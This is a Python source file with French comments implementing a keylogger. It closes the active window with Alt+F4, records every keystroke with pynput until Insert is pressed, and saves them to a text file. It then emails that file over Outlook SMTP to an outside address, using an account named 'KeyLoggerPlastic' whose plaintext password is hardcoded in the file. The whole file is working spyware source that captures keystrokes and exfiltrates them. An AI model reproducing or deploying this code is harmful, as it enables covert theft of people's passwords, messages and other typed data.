from pynput import keyboard
from pynput.keyboard import Key, Controller as KeyboardController
import time
import smtplib
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate


#def createFile(filename):   
 #   file = open('C:/Windows/System32/touches_capturées.txt', "w")
def send_email_with_attachment(smtp_server, smtp_port, from_email, password, to_email, subject, body, file_path):
    # Création du message
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject
    
    # Ajout du corps du message
    msg.attach(MIMEText(body, 'plain', 'utf-8'))
    
    # Ajout de la pièce jointe
    with open(file_path, 'rb') as file:
        attachment = MIMEApplication(file.read(), Name=file_path)
    attachment['Content-Disposition'] = f'attachment; filename="{file_path}"'
    msg.attach(attachment)

    # Envoi de l'email
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as mail:
            mail.ehlo()  # Initie la conversation avec le serveur
            mail.starttls()  # Démarre le chiffrement TLS
            mail.login(from_email, password)  # Authentification
            mail.sendmail(from_email, to_email, msg.as_string())  # Envoi de l'email
            print("Email envoyé avec succès.")
    except Exception as e:
        print(f"Erreur lors de l'envoi de l'email: {e}")

# Paramètres de l'email
smtp_server = 'smtp-mail.outlook.com'  # Exemple pour Outlook
smtp_port = 587  # Port pour TLS
from_email = 'KeyLoggerPlastic@outlook.com'  # Votre adresse email
password = 'fefgh5\'?3tv_sfsef'  # Votre mot de passe (Attention aux problèmes de sécurité)
to_email = 'plasticeaterg12@outlook.com'  # Adresse email du destinataire
subject = 'Voici votre fichier texte'
body = 'Veuillez trouver en pièce jointe le fichier texte demandé.'
file_path = 'C:/Temp/touches_capturées.txt'  # Chemin vers votre fichier texte




# Liste pour stocker les touches appuyées
touche_captures = []

# Créer une instance du contrôleur de clavier
clavier = KeyboardController()

# Fonction pour simuler Win + L
#def winL():
  #  print("Exécution de Win + L")
   # clavier.press(Key.cmd)
    #clavier.press('l')
#    time.sleep(2)  # Délai pour verrouiller l'écran
#
 #   clavier.release(Key.cmd)
  #  clavier.release('l')

   # time.sleep(1)  # Délai pour verrouiller l'écran

# Fonction appelée lorsqu'une touche est appuyée
def on_press(key):
    try:
        # Enregistrer la touche appuyée
        touche_captures.append(key.char)
    except AttributeError:
        # Enregistrer les touches spéciales
        touche_captures.append(str(key))

# Fonction appelée lorsqu'une touche est relâchée
def on_release(key):
    # Arrête l'écoute lorsqu'on appuie sur la touche ESC
    if key == Key.insert:
        return False

print("Création fichier")
#createFile()
print("Démarrage de l'écoute des touches")
time.sleep(0.5)  # Ce délai doit permettre au système de verrouiller l'écran
with clavier.pressed(Key.alt):
    clavier.press(Key.f4)
    clavier.release(Key.f4)
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Affiche les touches capturées
print("Touches capturées:", touche_captures)

# Enregistre les touches capturées dans un fichier
with open('C:/Temp/touches_capturées.txt', 'w') as file:
    for touche in touche_captures:
        file.write(f'{touche}\n')

send_email_with_attachment(smtp_server, smtp_port, from_email, password, to_email, subject, body, file_path)
